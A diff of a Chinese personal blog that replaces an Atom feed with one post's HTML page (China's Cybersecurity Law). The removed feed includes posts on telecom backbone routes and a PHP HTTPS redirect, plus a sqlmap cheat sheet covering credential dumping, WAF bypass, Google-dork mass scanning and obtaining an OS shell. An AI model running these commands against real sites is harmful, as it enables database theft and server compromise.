@@ -1,74 +1,92 @@
-<?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom">
-    <id>https://domognete76.github.io</id>
-    <title>零度时光</title>
-    <updated>2020-08-05T09:30:08.246Z</updated>
-    <generator>https://github.com/jpmonette/feed</generator>
-    <link rel="alternate" href="https://domognete76.github.io"/>
-    <link rel="self" href="https://domognete76.github.io/atom.xml"/>
-    <subtitle>温故而知新</subtitle>
-    <logo>https://domognete76.github.io/images/avatar.png</logo>
-    <icon>https://domognete76.github.io/favicon.ico</icon>
-    <rights>All rights reserved 2020, 零度时光</rights>
-    <entry>
-        <title type="html"><![CDATA[给大家普及普及下电信直连、CN2（GIA）、本土运营商]]></title>
-        <id>https://domognete76.github.io/post/gei-da-jia-pu-ji-pu-ji-xia-dian-xin-zhi-lian-cn2giaben-tu-yun-ying-shang/</id>
-        <link href="https://domognete76.github.io/post/gei-da-jia-pu-ji-pu-ji-xia-dian-xin-zhi-lian-cn2giaben-tu-yun-ying-shang/">
-        </link>
-        <updated>2020-08-05T09:27:56.000Z</updated>
-        <content type="html"><![CDATA[<blockquote>
-<p>via:http://www.hostloc.com/thread-363211-1-1.html</p>
-</blockquote>
-<p>最近骨干网实在是太渣了，把我了解的一些情况介绍给大家，主要讲到中国方向，希望能解释大家的一些疑惑，如果有不准确的地方还望 指教。</p>
-<p>先说说中国电信吧。</p>
-<p>中国电信目前有4个IPT产品，由于某些原因就不讲得过于详细，就说说163、CN2吧。</p>
-<p>163骨干网也就是我们通常说的AS4134接入的带宽，是中国电信的骨干网，也就是我们经常看到202.97开头的路由，此网络负责了90%的电信业务负载（163有电信整个海外出口的90%带宽容量）。</p>
-<p>目前直接和163有Peer比如饭桶、QN、CERA等机房，最近全163路由的机房都表现得不理想，其实并不是机房的问题，而是目前163回国方向非常拥堵（godaddy啥的超大规模流量往国内攻击）导致大家都很不开心。但是也有机房采用163 IN的方向，OUT使用其他运营商来解决，稍后说到。</p>
-<p>美洲电信AS36678</p>
-<p>这是中国电信美洲分公司自己的ASN号码，实际上就比4134多了一跳，质量上和4134是一个级别（当然也不排除36678和4134的链路被打满就傻逼了）。 36678的优点是接入灵活也有Telia接入能够解决美国本土一些的访问需求。36678用美洲分公司直接运营，不需要经过电信集团公司审批，适合快速业务上线需求。</p>
-<p>电信CN2 GT</p>
-<p>CN2 GT是电信CN2产品线中的global transit的产品，CN2 GT到中国国际出口拥有自己的单独线路，但是进入国内的还是使用的163出口。</p>
-<p>接入CN2 GT的机房也比较多，例如C3、ENZU、esited等等，所以这也是最近为什么C3这些机房都出现了回国堵死的情况，因为实际上CN2 GT共享上的是163的出口，CN2 GT并没有自己的中国出口。 这也是为什么CN2 GT会走到很多202的163骨干上去就是这个原因。</p>
-<p>中国电信 CN2 GIA</p>
-<p>这是电信号称的明星产品，和CN2 GT最大的区别在于，CN2 GIA拥有独立的回国链路，属于轻度负载以保证访问品质。 这种带宽的质量应当是电信网络最好的，但是缺点也比较明显。 缺点一，整个GIA的出口带宽较小，容易在较大流量攻击的时候导致整个GIA网络波动，和攻击的随机性比较强一样，指不定什么时候抽一抽。 缺点二、价格相对较贵，价格是CN2 GT的3倍左右的售价。<br>
-当然对有些要求高又多金的客户来说，这肯定是不二的选择。</p>
-<p>中国联通</p>
-<p>中国联通有点无力吐槽，我们CERA目前已经启用20G联通直连线路，但是我们发现一个比较坑的现象，不论是联通的VIP RT线路 还是普通的线路都异常拥堵，高峰期延迟高、丢包厉害。 甚至还不如走GTT等到联通方向好，这也是为什么我们几乎没有把我们客户联通流量走直连线路，所以对联通没有太多好说的。。PS一下，联通说海底光缆断了很多，5月底或6月初修好。至于真实效率，建议联通用户一起呵呵。</p>
-<p>中国移动</p>
-<p>中国移动由于我们目前并没有完成接入，并且也没有太多移动用户反馈，所以这部分我们不做任何意见发表。</p>
-<p>海外运营商</p>
-<p>我们将GTT、Telia、HE等非中国的运营商统一称为海外运营商，这些运营商由于有庞大的用户基数，电信也希望自己的内容以及用户能较好的和这些资源进行交互，所以电信与海外运营商通过163骨干网做了非常多的peer节点，并且是免费给这些运营商提供的。 这也就是为什么海外运营商可以非常廉价的将带宽卖给IDC使用，也不去区分中国方向。（这恰好和香港的策略是反的，香港运营商都需要高价向中国电信购买带宽，即便是PCCW这样的顶级运营商也不例外，所以香港我们可以看到纯中国方向没有低于80美金/M的报价，个中缘由不做深度讨论） 联通和移动与海外运营商交换流量就更有意思了，联通、移动付费购买海外运营商的流程。</p>
-<p>我这里主要谈一下海外运营商到中国的问题，由于海外运营商这种免费的交换策略以及海外运营商足够多的peer、足够多的用户就导致了他们和中国方向的交换机端口 很容易出现拥堵的情况，也就是说他们还没有进入中国电信的网络就已经开始堵死，这也就是为什么163骨干不堵的时候部分运营商堵，原因就是他们和电信的交换机端口堵了（大部分原因是攻击过大导致，例如CF常年把GTT玩坏事一个道理）</p>
-<p>当然海外运营商也有他的优势，现在攻击来自欧美方向的流量异常凶猛，数百G非常容易看到，但是这些海外运营商在欧美市场属于他们的本土业务，他们有非常强大的骨干网资源,所以我们CERA也接入了大量的GTT、Telia、Zayo、Cogent、HE等来清洗海外的流量，目前总出口已经达到500Gbps规模。</p>
-<p>163结合CN2 GIA</p>
-<p>这是一种极少数ISP采用的方案，CN2 GIA我们上面有提到拥有很小的骨干网，很容易因为攻击导致歇菜，所以我们CERA提供163 IN用来保障客户的业务不会因为攻击造成中断（大流量的攻击代价过大，都是用带宽来抗没有接近，所以CERA接入了100G的4134带宽来解决中国方向的流量），然后让OUT方向走CN2 GIA来提供最好的访问品质，例如咱hostloc.com就采用了这样的网络架构，前段有163以及海外运营商大容量网络提供流量清洗，回国有CN2 GIA保障业务质量，这目前基本上是最优的配置方案，没有之一。 这种特点依然是GIA带宽价格过高，不会有廉价的产品。</p>
-<p>当然也有163结合海外运营商的玩法，有些时候某些海外ISP走的路由也不堵，我们也会把部分流量往这方面送。 因为CN2 GIA偶尔也有BOOM的时候。</p>
-<p>总之，怎么优化到中国方向的访问质量一直是一个大课题，我们还在学习研究路上。</p>
-<p>写在最后，由于本人的知识有限、文笔能力属于词不达意级别，所以一定会有错误或表达不妥的地方，还望大家指出，虚心接受并改正。</p>
-<p>同时欢迎IDC同行和我交流。</p>
-<p>CeRaNetworks-李恒<br>
-QQ：3001680336<br>
-电话：028-86285555 分机830</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[《Windows 绝赞应用》推荐列表]]></title>
-        <id>https://domognete76.github.io/post/lesslesswindows-jue-zan-ying-yong-greatergreater-tui-jian-lie-biao/</id>
-        <link href="https://domognete76.github.io/post/lesslesswindows-jue-zan-ying-yong-greatergreater-tui-jian-lie-biao/">
-        </link>
-        <updated>2020-08-05T09:27:39.000Z</updated>
-        <content type="html"><![CDATA[<p><a href="https://www.gitbook.com/book/emlvirus/windows-apps-that-amaze-us/details">官方介绍</a></p>
-<p><a href="https://emlvirus.gitbooks.io/windows-apps-that-amaze-us/content/">推荐界面</a></p>
-<p>PS:有些工具的确很有用，值得一看。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[中华人民共和国网络安全法]]></title>
-        <id>https://domognete76.github.io/post/zhong-hua-ren-min-gong-he-guo-wang-luo-an-quan-fa/</id>
-        <link href="https://domognete76.github.io/post/zhong-hua-ren-min-gong-he-guo-wang-luo-an-quan-fa/">
-        </link>
-        <updated>2020-08-05T09:27:23.000Z</updated>
-        <content type="html"><![CDATA[<p>原文：<a href="http://www.miit.gov.cn/n1146295/n1146557/n1146614/c5345009/content.html">中华人民共和国网络安全法</a><br>
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>中华人民共和国网络安全法 | 零度时光</title>
+<meta name="description" content="温故而知新">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://domognete76.github.io/favicon.ico?v=1596619793061">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://domognete76.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://domognete76.github.io">
+        <img class="avatar" src="https://domognete76.github.io/images/avatar.png?v=1596619793061" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://domognete76.github.io">
+        <h1 class="site-title">零度时光</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">中华人民共和国网络安全法</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2020-08-05</span>
+            
+          </div>
+          <div class="post-content">
+            <p>原文：<a href="http://www.miit.gov.cn/n1146295/n1146557/n1146614/c5345009/content.html">中华人民共和国网络安全法</a><br>
 中华人民共和国主席令<br>
 第五十三号<br>
 《中华人民共和国网络安全法》已由中华人民共和国第十二届全国人民代表大会常务委员会第二十四次会议于2016年11月7日通过，现予公布，自2017年6月1日起施行。<br>
@@ -226,197 +244,59 @@ QQ：3001680336<br>
 第七十七条  存储、处理涉及国家秘密信息的网络的运行安全保护，除应当遵守本法外，还应当遵守保密法律、行政法规的规定。<br>
 第七十八条  军事网络的安全保护，由中央军事委员会另行规定。<br>
 第七十九条  本法自2017年6月1日起施行。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[PHP实现 HTTP 自动跳转 HTTPS]]></title>
-        <id>https://domognete76.github.io/post/php-shi-xian-http-zi-dong-tiao-zhuan-https/</id>
-        <link href="https://domognete76.github.io/post/php-shi-xian-http-zi-dong-tiao-zhuan-https/">
-        </link>
-        <updated>2020-08-05T09:27:01.000Z</updated>
-        <content type="html"><![CDATA[<!--more-->
-<blockquote>
-<p>刚刚给网站安装上了 SSL 证书，并且可以成功使用 HTTPS 进行访问。可一会儿就遇到了非常严重的问题，那就是在访问 HTTP 时并不会自动跳转至 HTTPS。<br>
-于是我百度，Google 了好久，都没能够找到适用于虚拟主机实现自动跳转的方法（如果是 VPS 的话就很简单，百度就有很多方法可以实现），不过后来我想到了一个方法，就是能不能通过在网站头部加入 PHP 代码实现自动跳转呢？</p>
-</blockquote>
-<p>终于让我在<a href="https://liyuans.com/archives/http-automatic-jump-https.html">某博客</a>找到了以下代码：</p>
-<pre><code class="language-php">   &lt;?php
-     if ($_SERVER[&quot;HTTPS&quot;] &lt;&gt; &quot;on&quot;)
-    {
-        $xredir = &quot;https://&quot;.$_SERVER[&quot;SERVER_NAME&quot;].$_SERVER[&quot;REQUEST_URI&quot;];
-        header(&quot;Location: &quot;.$xredir);
-    }
-    ?&gt;
-</code></pre>
-<!--more-->
-<p>我抱着试试看的心态，直接将上面的代码添加至网站头部，令人惊喜的是，真的成功实现了自动跳转，而且是直接跳转，不会加载一会儿再跳转。<br>
-最后说一下如何在 Typecho、WordPress 等中使用此方法：直接将上面的代码添加至你的模板里的 header.php 文件的顶部即可。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[SQLmap使用笔记]]></title>
-        <id>https://domognete76.github.io/post/sqlmap-shi-yong-bi-ji/</id>
-        <link href="https://domognete76.github.io/post/sqlmap-shi-yong-bi-ji/">
-        </link>
-        <updated>2020-08-05T09:24:24.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="sqlmap的常用语法">SQLMap的常用语法</h2>
-<pre><code>1../sqlmap.py -u &quot;www.xxx.com/news.asp?id=1&quot;//检查注入点
 
-2.sqlmap -u &quot;www.xxx.com/news.asp?id=1&quot; --current-user//获取当前用户名
+          </div>
+        </div>
 
-3.sqlmap -u &quot;www.xxx.com/news.asp?id=1&quot; --current-db//获取数据库名，得到库admin
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://domognete76.github.io/post/php-shi-xian-http-zi-dong-tiao-zhuan-https/">
+              <h3 class="post-title">
+                下一篇：PHP实现 HTTP 自动跳转 HTTPS
+              </h3>
+            </a>
+          </div>
+          
+      </div>
 
-4.sqlmap -u &quot;www.xxx.com/news.asp?id=1&quot; --privileges//权限判断
+      
 
-5.sqlmap -u &quot;www.xxx.com/news.asp?id=1&quot; --users//枚举管理系统用户
+      <div class="site-footer">
+  <div class="slogan">温故而知新</div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  ICP备案网站信息<a href="http://beian.miit.gov.cn/" target="_blank">鄂ICP备17008616号 </a>|
+本网站由<a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank"><img src="https://i.loli.net/2020/08/05/HdGZmTIEUgwft94.png" height="50" width="100" /></a>提供 CDN 加速/云存储服务 | <a class="rss" href="https://domognete76.github.io/atom.xml" target="_blank">RSS</a>
+</div>
 
-6.sqlmap -u &quot;www.xxx.com/news.asp?id=1&quot; --passwords//枚举管理系统用户哈希
 
-7.sqlmap -u &quot;www.xxx.com/news.asp?id=1&quot; --tables -D &quot;admin&quot;//查admin库中的表名，得到user表
+    </div>
+    <script type="application/javascript">
 
-8.sqlmap -u &quot;www.xxx.com/news.asp?id=1&quot; --columns -T &quot;user&quot; -D &quot;admin&quot; -v 5//查字段，v后数字越大越详细，得到id,username,password
+hljs.initHighlightingOnLoad()
 
-9.sqlmap -u &quot;www.xxx.com/news.asp?id=1&quot; --dump -C &quot;id,username,password&quot; -T &quot;user&quot; -D &quot;admin&quot; -v 5//拖库，或者使用--dump-all
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
 
-10.--dbms &quot;Mysql&quot;//指定数据库类型
-
-11.--dbs//列数据库
-
-12.--passwords -U root//指定列数据库用户root的密码
-
-13.--level 5//执行测试的等级
-
-14.--user-agent &quot;Googlebot/2.1&quot;
-
-15.--tamper &quot;space2morehash.py&quot;
-
-以上为常用sqlmap命令，其他的请查阅手册。
-</code></pre>
-<hr>
-<h2 id="sqlmap-借助google批量扫注入点">SQLmap 借助google批量扫注入点</h2>
-<pre><code>1.sqlmap -g &quot;site:target.com inurl:asp&quot;
-
-2.如果要查询注入选y，跳过选n
+</script>
 
 
 
-注：大部分查询结果不存在注入
-</code></pre>
-<hr>
-<h2 id="sqlmap-利用编码绕过waf">SQLmap 利用编码绕过WAF</h2>
-<pre><code>通过不同编码，绕过WAF
 
-1.sqlmap -u &quot;www.xxx.com/news.asp?id=1&quot; --dbs --tamper &quot;space2morehash.py&quot;//利用.py脚本改变编码，除了space2hash.py，还有base64encode.py、charencode.py等等，可查/usr/share/sqlmap/tamper
-
-2.sqlmap.py --proxy http://127.0.0.1:8087 -u &quot;www.xxx.com/news.asp?id=1&quot; -v 3 –dbms “MySQL” --tamper &quot;space2morehash.py&quot; --referer &quot;http://www.google.com&quot; --user-agent &quot;Googlebot/2.1&quot;  //模拟google爬虫
-</code></pre>
-<hr>
-<h2 id="sqlmap-post注入">SQLmap post注入</h2>
-<pre><code>方法一：结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。
-
-1.浏览器打开目标地址 http://www.testfire.net/bank/login.aspx
-
-2.配置burp代理(127.0.0.1:8080)以拦截请求
-
-3.点击login表单的submit按钮
-
-4.如下图，这时候Burp会拦截到了我们的登录POST请求
-
-5.把这个post请求复制为txt, 我这命名为testfire.txt 然后把它放至root目录下
-
-6.运行sqlmap并使用如下命令：sqlmap -r /root/testfire.txt -p uid，这里参数 -r 是让sqlmap加载我们的post请求testfire.txt，而 -p 为指定注入用的参数。
-
-
-
-方法二：指定参数post注入
-
-1.sqlmap -u &quot;http://www.testfire.net/bank/login.aspx&quot; --data &quot;uid=Admin&amp;passw=a&amp;btnSubmit=Login&quot;
-</code></pre>
-<hr>
-<h2 id="sqlmap-cookies注入">SQLmap cookies注入</h2>
-<pre><code>1.sqlmap -u &quot;www.xxx.com/news.asp&quot; --cookie &quot;id=1&quot; --current-db
-
-2.sqlmap -u &quot;www.xxx.com/news.asp&quot; --cookie &quot;id=1&quot; --tables -D &quot;admin&quot;
-
-......
-
-
-
-注：注入时有可能存在连接线程数限制，线程设置不要太大
-</code></pre>
-<hr>
-<h2 id="sqlmap-执行shell命令">SQLmap 执行shell命令</h2>
-<pre><code>在数据库权限足够大的时候，可以使用cmd命令:
-
-1.sqlmap -u &quot;www.xxx.com/news.asp?id=1&quot; --os-cmd=ipconfig//执行ipconfig命令
-
-2.选取该web的脚本种类，此时为asp，选1
-
-3.指定网站的根目录路径，如：d:\www\
-
-
-
-获得一个shell
-
-1.sqlmap -u &quot;www.xxx.com/news.asp?id=1&quot; --os-shell
-
-2.选取该web的脚本种类，此时为asp，选1
-
-3.指定网站的根目录路径，如：d:\www\
-
-4.此时可以执行命令，并会在d:\www\下生成两个临时文件（tmpbxbxz.php/tmpuoiuz.php）
-</code></pre>
-<hr>
-<h2 id="sqlmap-伪静态注入">SQLmap 伪静态注入</h2>
-<pre><code>伪静态页面网址：www.xxx.com/index.php/Index/view/id/40.html
-
-1.sqlmap -u &quot;www.xxx.com/index.php/Index/view/id/40*.html&quot; --dbs//在存在注入的地方加入*键
-
-2.sqlmap -u &quot;www.xxx.com/index.php/Index/view/id/40*.html&quot; --tables -D &quot;admin&quot;
-
-......
-</code></pre>
-<hr>
-<h2 id="sqlmap-延迟注入">SQLmap 延迟注入</h2>
-<pre><code>某些网站有防注入保护，短时间内如果请求次数较多或短时间内请求错误页面次数较多都可能被网站屏蔽
-
-1.sqlmap -u &quot;www.xxx.com/index.php/Index/view/id/40*.html&quot; --dbs --delay 5//间隔5秒请求一次
-
-2.--safe-url//详细说明请查阅手册
-
-3.--safe-freq//详细说明请查阅手册</code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Hello Gridea]]></title>
-        <id>https://domognete76.github.io/post/hello-gridea/</id>
-        <link href="https://domognete76.github.io/post/hello-gridea/">
-        </link>
-        <updated>2018-12-11T16:00:00.000Z</updated>
-        <summary type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
-✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
-]]></summary>
-        <content type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
-✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
-<!-- more -->
-<p><a href="https://github.com/getgridea/gridea">Github</a><br>
-<a href="https://gridea.dev/">Gridea 主页</a><br>
-<a href="http://fehey.com/">示例网站</a></p>
-<h2 id="特性">特性👇</h2>
-<p>📝  你可以使用最酷的 <strong>Markdown</strong> 语法，进行快速创作</p>
-<p>🌉  你可以给文章配上精美的封面图和在文章任意位置插入图片</p>
-<p>🏷️  你可以对文章进行标签分组</p>
-<p>📋  你可以自定义菜单，甚至可以创建外部链接菜单</p>
-<p>💻  你可以在 <strong>Windows</strong>，<strong>MacOS</strong> 或 <strong>Linux</strong> 设备上使用此客户端</p>
-<p>🌎  你可以使用 <strong>𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌</strong> 或 <strong>Coding Pages</strong> 向世界展示，未来将支持更多平台</p>
-<p>💬  你可以进行简单的配置，接入 <a href="https://github.com/gitalk/gitalk">Gitalk</a> 或 <a href="https://github.com/SukkaW/DisqusJS">DisqusJS</a> 评论系统</p>
-<p>🇬🇧  你可以使用<strong>中文简体</strong>或<strong>英语</strong></p>
-<p>🌁  你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力</p>
-<p>🖥  你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步</p>
-<p>🌱 当然 <strong>Gridea</strong> 还很年轻，有很多不足，但请相信，它会不停向前 🏃</p>
-<p>未来，它一定会成为你离不开的伙伴</p>
-<p>尽情发挥你的才华吧！</p>
-<p>😘 Enjoy~</p>
-]]></content>
-    </entry>
-</feed>
+  </body>
+</html>
